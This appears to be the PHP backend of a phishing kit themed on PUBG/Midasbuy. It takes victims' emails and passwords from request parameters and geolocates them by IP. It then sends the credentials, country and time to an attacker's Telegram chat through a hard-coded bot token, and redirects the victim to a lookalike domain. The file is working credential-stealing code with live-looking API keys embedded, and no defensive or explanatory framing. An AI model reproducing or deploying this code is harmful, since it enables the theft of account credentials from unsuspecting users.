<?php
ob_start();
$API_KEY = '1998073200:AAGxMIV6HxJ5tUWAmLjig5UwYP98Pqhewus';
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $tbbots = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$tbbots";
        $ttktt = file_get_contents($url);
        return json_decode($ttktt);
}
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
date_default_timezone_set('Asia/Baghdad');
$time = date('h:i');
$year = date('Y');
$month = date('n');
$day = date('j');
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$user = $message->from->username;

$admin = "831161538";
$email = $_GET["email"];
$password = $_GET["password"];
$login = $_GET["login"];
$linky = $_SERVER['HTTP_HOST'];

if($email){
$api_key = "26dc150b1cf3c41dc866400812300e6d";
$cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
$jsondata = json_decode($cty1);
$cty = $jsondata->country_name;
$url1 = "https://pubgmidasbuy.me";
header("location: $url1");
$name = $message->from->first_name;
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
𝐍𝐞𝐰 𝐋𝐨𝐠𝐢𝐧 𝐁𝐲 $login
👤 ¦ 𝑬𝒎𝒂𝒊𝒍 » `$email`
📟 ¦ 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅  » `$password`
👁️‍🗨️¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 » $cty
⏱ ¦ 𝑻𝒊𝒎𝒆 » $time
📝 ¦ 𝑫𝒂𝒕𝒆 » $day/$month/$year
🌐¦ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌 » https://$linky/index.php
˹ 𝙳𝙴𝚅 𝙱𝚈 @PHP505 ˼
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
?>
<html>
  <head>
    <meta http-equiv="refresh" content="0; url='/index.php'" />
    <script type="text/javascript">
            window.location.href = "/index.php"
    </script>
 </head>
  <body>
  </body>
</html>
<?
?>


